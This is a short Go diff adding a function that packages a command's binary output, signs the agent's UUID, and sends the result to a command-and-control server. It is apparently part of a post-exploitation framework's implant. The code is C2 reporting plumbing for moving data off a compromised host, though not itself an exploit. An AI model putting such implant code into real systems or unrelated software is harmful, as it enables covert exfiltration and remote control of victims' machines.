@@ -79,3 +79,28 @@ func NotifyC2(cmd *cobra.Command, format string, args ...interface{}) {
 		logging.Printf("Response sent: <Binary Data, length %d>", len(msg.Response))
 	}
 }
+
+// NotifyC2Binary sends raw binary response to a cobra command to CC
+func NotifyC2Binary(cmd *cobra.Command, data []byte) {
+	msg := def.MsgTunData{
+		Tag:       common.RuntimeConfig.AgentTag,
+		AgentUUID: common.RuntimeConfig.AgentUUID,
+	}
+	// Sign UUID with Agent Key for session auth
+	sig, err := agentutils.SignWithAgentKey([]byte(msg.AgentUUID))
+	if err != nil {
+		logging.Errorf("NotifyC2Binary SignWithAgentKey: %v", err)
+		msg.AgentUUIDSig = common.RuntimeConfig.AgentUUIDSig // Fallback
+	} else {
+		msg.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)
+	}
+	cmd_id, _ := cmd.Flags().GetString("cmd_id")
+	cmdSlice := []string{cmd.Name()}
+	msg.CmdID = cmd_id
+	msg.CmdSlice = cmdSlice
+	msg.Response = data
+	if err := send2CC(&msg); err != nil {
+		logging.Println(err)
+	}
+	logging.Printf("Response sent: <Binary Data, length %d>", len(msg.Response))
+}
